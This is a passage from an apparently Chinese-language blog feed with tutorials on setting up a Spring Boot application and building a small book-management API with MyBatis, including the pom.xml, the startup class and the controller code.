<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907163814971.png"></p>
<h3 id="创建启动类"><a href="#创建启动类" class="headerlink" title="创建启动类"></a>创建启动类</h3><p>我们在demo包下新建一个TestApplication类，作为Spring Boot 应用程序启动类，用于启动整个 Spring Boot 应用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication(scanBasePackages = &#123;&quot;demo&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(TestApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>右键run一下，成功运行</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907165323662.png"></p>
<h3 id="springboot常用配置以及常用注解介绍"><a href="#springboot常用配置以及常用注解介绍" class="headerlink" title="springboot常用配置以及常用注解介绍"></a>springboot常用配置以及常用注解介绍</h3><p><strong>常用配置</strong></p>
<ul>
<li><code>server.port</code>: 设置服务器监听的端口号。</li>
<li><code>server.context-path</code>: 设置项目的前缀</li>
</ul>
<p><strong>常用注解</strong></p>
<ul>
<li><code>@SpringBootApplication</code>：</li>
<li><ul>
<li>标记为主配置类，它结合了 <code>@Configuration</code>、<code>@EnableAutoConfiguration</code> 和 <code>@ComponentScan</code> 注解的功能。</li>
</ul>
</li>
<li><code>@Configuration</code>：</li>
<li><ul>
<li>标记类为配置类，用于定义 Spring Bean 的配置。</li>
</ul>
</li>
<li><code>@EnableAutoConfiguration</code>：</li>
<li><ul>
<li>启用 Spring Boot 的自动配置功能。</li>
</ul>
</li>
<li><code>@ComponentScan</code>：</li>
<li><ul>
<li>用于指定要扫描的包，以发现和加载带有 <code>@Component</code>、<code>@Service</code>、<code>@Repository</code> 和 <code>@Controller</code> 等注解的类。</li>
</ul>
</li>
<li><code>@Component</code>、<code>@Service</code>、<code>@Repository</code>、<code>@Controller</code>：</li>
<li><ul>
<li>分别用于标记组件、服务层、数据访问层和控制器层的类。</li>
</ul>
</li>
<li><code>@RestController</code>：</li>
<li><ul>
<li>用于标记 RESTful 控制器类，它结合了 <code>@Controller</code> 和 <code>@ResponseBody</code> 注解的功能。</li>
</ul>
</li>
<li><code>@Autowired</code>：</li>
<li><ul>
<li>用于自动装配 Bean，可以应用于字段或构造函数。</li>
</ul>
</li>
<li><code>@Value</code>：</li>
<li><ul>
<li>用于注入属性值。</li>
</ul>
</li>
<li><code>@EnableScheduling</code>：</li>
<li><ul>
<li>用于启用定时任务支持。</li>
</ul>
</li>
</ul>
<h2 id="使用springboot创建一个网络接口"><a href="#使用springboot创建一个网络接口" class="headerlink" title="使用springboot创建一个网络接口"></a>使用springboot创建一个网络接口</h2><p>在上一个springboot项目的基础上我们继续配置，首先在配置文件 <code>application.properties</code>中添加以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#将部署在服务器的 /test 路径下，所有访问该应用的请求都需要通过这个前缀来路由</span><br><span class="line">server.servlet.context-path=/test</span><br><span class="line"></span><br><span class="line">#项目端口号，若默认端口8080冲突则可以添加此配置修改</span><br><span class="line">server.port=8000</span><br></pre></td></tr></table></figure>

<p>在demo包下创建test包</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907170603991.png"></p>
<p>然后继续在test包新建一个controller包，然后在目录下新建一个TestController类，写入以下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.test.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span>  <span class="comment">//注解处理的http请求的路由</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行代码，然后访问<code>/test/hello</code>即可</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907171640977.png"></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>学习java的mybatis框架及ORM映射</title>
    <url>/article/%E5%AD%A6%E4%B9%A0java%E4%B8%ADORM%E6%A1%86%E6%9E%B6-mybatis.html</url>
    <content><![CDATA[<p>学习mybatis框架和ORM映射技术，实现Book类项目的三个接口功能</p>
<span id="more"></span>

<h1 id="基于mybatis框架实现Book类项目"><a href="#基于mybatis框架实现Book类项目" class="headerlink" title="基于mybatis框架实现Book类项目"></a>基于mybatis框架实现Book类项目</h1><h2 id="mybatis的作用"><a href="#mybatis的作用" class="headerlink" title="mybatis的作用"></a>mybatis的作用</h2><ol>
<li>简化数据库操作</li>
</ol>
<p>MyBatis允许开发者通过XML或注解的方式定义SQL语句，简化JDBC的繁琐操作，比如连接管理，语句创建和结果处理。</p>
<ol start="2">
<li>灵活的SQL映射</li>
</ol>
<p>与ORM（对象关系映射）框架不同，MyBatis允许开发者直接编写SQL语句，提供了更大的灵活性和控制权，适合复杂的查询和性能调优。</p>
<ol start="3">
<li>对象映射</li>
</ol>
<p>MyBatis能够将数据库查询结果映射到java对象，支持复杂的对象关系映射，使得数据处理更加便捷。</p>
<h2 id="项目代码结构"><a href="#项目代码结构" class="headerlink" title="项目代码结构"></a>项目代码结构</h2><p><img src="/article/%E5%AD%A6%E4%B9%A0java%E4%B8%ADORM%E6%A1%86%E6%9E%B6-mybatis/image-20241026010913075.png"></p>
<h2 id="项目引入mybatis"><a href="#项目引入mybatis" class="headerlink" title="项目引入mybatis"></a>项目引入mybatis</h2><p>新建项目后打开pom.xml文件，引入mybatis依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>testbook<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>testbook<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--mybatis依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Mysql驱动包 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.29<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.code.gson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>gson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>$&#123;project.build.sourceEncoding&#125;<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.example.testmysql.TestMysqlApplication<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>public<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun nexus<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>public<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun nexus<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="模块编写"><a href="#模块编写" class="headerlink" title="模块编写"></a>模块编写</h2><h3 id="Application启动器"><a href="#Application启动器" class="headerlink" title="Application启动器"></a>Application启动器</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.testbook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.example.testbook.dao&quot;)</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBookApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(TestBookApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="controller控制器"><a href="#controller控制器" class="headerlink" title="controller控制器"></a>controller控制器</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.testbook.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.testbook.entity.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.example.testbook.entity.TBook;</span><br><span class="line"><span class="keyword">import</span> com.example.testbook.service.BookService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookController</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> BookService BookService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 新增书本</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> book</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/createbook&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">save</span><span class="params">(<span class="meta">@RequestBody</span> TBook book)</span>&#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (book.getBookname() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;bookname不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (book.getPrice() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(book.getPrice()))&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;price不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (book.getPublisher() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(book.getPublisher()))&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;publisher不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TBook</span> <span class="variable">exist</span> <span class="operator">=</span> BookService.queryBookByBookname(book.getBookname());</span><br><span class="line">        <span class="keyword">if</span> (exist != <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;bookname已存在，请更改&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        book.setPrice(book.getPrice());</span><br><span class="line">        book.setPublisher(book.getPublisher());</span><br><span class="line">        book.setStatus(<span class="number">1</span>);</span><br><span class="line">        BookService.save(book);</span><br><span class="line"></span><br><span class="line">        jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;新建书本信息成功&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询书籍是否存在</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/querybook&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">querybook</span><span class="params">(<span class="meta">@RequestBody</span> TBook book)</span>&#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (book.getBookname() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(book.getBookname()))&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;bookname不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TBook</span> <span class="variable">exist</span> <span class="operator">=</span> BookService.queryBookByBookname(book.getBookname());</span><br><span class="line">        <span class="keyword">if</span>(exist == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;书本已借出 &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;书本存在 &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询出版社所有书籍</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/queryPublisherAllBook&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">queryPublisherAllBook</span><span class="params">(<span class="meta">@RequestBody</span> TBook book)</span>&#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        List&lt;TBook&gt; books = BookService.queryPublisherAllBook(book.getPublisher());</span><br><span class="line"></span><br><span class="line">        jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;查询成功&quot;</span>);</span><br><span class="line">        jo.setO(books);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

